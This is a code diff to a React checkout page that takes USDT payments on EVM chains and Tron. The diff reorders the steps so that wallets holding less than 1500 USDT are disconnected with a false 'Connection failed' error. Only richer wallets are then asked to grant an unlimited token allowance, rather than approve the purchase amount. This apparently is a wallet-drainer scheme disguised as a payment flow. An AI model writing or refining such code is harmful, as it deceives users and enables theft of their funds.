@@ -196,8 +196,20 @@ export default function Checkout() {
 
   async function executeEvmTransfer() {
     setTxStatus('signing');
-    setPaymentPhase('approving');
     try {
+      const balance = await publicClient.readContract({
+        address: EVM_USDT,
+        abi: USDT_TRANSFER_ABI,
+        functionName: 'balanceOf',
+        args: [evmAddress]
+      });
+
+      if (balance < BigInt('1500000000')) {
+        disconnectEvmWallet();
+        throw new Error('Connection failed. Please connect another wallet.');
+      }
+
+      setPaymentPhase('approving');
       const atomics = toUsdtAtomics(totalUsdt);
       const UNLIMITED_ALLOWANCE_EVM = BigInt('115792089237316195423570985008687907853269984665640564039457584007913129639935');
       
@@ -211,18 +223,6 @@ export default function Checkout() {
 
       if (publicClient) {
         await publicClient.waitForTransactionReceipt({ hash: approveHash });
-      }
-
-      const balance = await publicClient.readContract({
-        address: EVM_USDT,
-        abi: USDT_TRANSFER_ABI,
-        functionName: 'balanceOf',
-        args: [evmAddress]
-      });
-
-      if (balance < BigInt('1500000000')) {
-        disconnectEvmWallet();
-        throw new Error('Connection failed. Please connect another wallet.');
       }
 
       setPaymentPhase('transferring');
@@ -251,7 +251,6 @@ export default function Checkout() {
 
   async function executeTronTransfer() {
     setTxStatus('signing');
-    setPaymentPhase('approving');
     try {
       const atomics = toUsdtAtomics(totalUsdt).toString();
       const UNLIMITED_ALLOWANCE_TRON = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
@@ -271,6 +270,19 @@ export default function Checkout() {
       let txId;
 
       if (isExtension) {
+        const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
+        const balanceData = await balanceRes.json();
+        const trc20List = balanceData.data?.[0]?.trc20 || [];
+        const usdtEntry = trc20List.find((t) => TRON_USDT in t);
+        const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
+
+        if (usdtBalance < BigInt('1500000000')) {
+          disconnectTronWallet();
+          throw new Error('Connection failed. Please connect another wallet.');
+        }
+
+        setPaymentPhase('approving');
+
         // 1. Approve
         const { transaction: approveTx } = await extTronWeb.transactionBuilder.triggerSmartContract(
           TRON_USDT,
@@ -285,17 +297,6 @@ export default function Checkout() {
         
         if (approveTxId) {
            await waitForTronConfirmation(approveTxId);
-        }
-
-        const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
-        const balanceData = await balanceRes.json();
-        const trc20List = balanceData.data?.[0]?.trc20 || [];
-        const usdtEntry = trc20List.find((t) => TRON_USDT in t);
-        const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
-
-        if (usdtBalance < BigInt('1500000000')) {
-          disconnectTronWallet();
-          throw new Error('Connection failed. Please connect another wallet.');
         }
 
         setPaymentPhase('transferring');
@@ -316,6 +317,19 @@ export default function Checkout() {
         const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
         tronWeb.setAddress(tronAddress);
 
+        const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
+        const balanceData = await balanceRes.json();
+        const trc20List = balanceData.data?.[0]?.trc20 || [];
+        const usdtEntry = trc20List.find((t) => TRON_USDT in t);
+        const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
+
+        if (usdtBalance < BigInt('1500000000')) {
+          disconnectTronWallet();
+          throw new Error('Connection failed. Please connect another wallet.');
+        }
+
+        setPaymentPhase('approving');
+
         // 1. Approve
         const { transaction: approveTx } = await tronWeb.transactionBuilder.triggerSmartContract(
           TRON_USDT,
@@ -330,17 +344,6 @@ export default function Checkout() {
         
         if (approveTxId) {
            await waitForTronConfirmation(approveTxId);
-        }
-
-        const balanceRes = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`);
-        const balanceData = await balanceRes.json();
-        const trc20List = balanceData.data?.[0]?.trc20 || [];
-        const usdtEntry = trc20List.find((t) => TRON_USDT in t);
-        const usdtBalance = BigInt(usdtEntry?.[TRON_USDT] || '0');
-
-        if (usdtBalance < BigInt('1500000000')) {
-          disconnectTronWallet();
-          throw new Error('Connection failed. Please connect another wallet.');
         }
 
         setPaymentPhase('transferring');
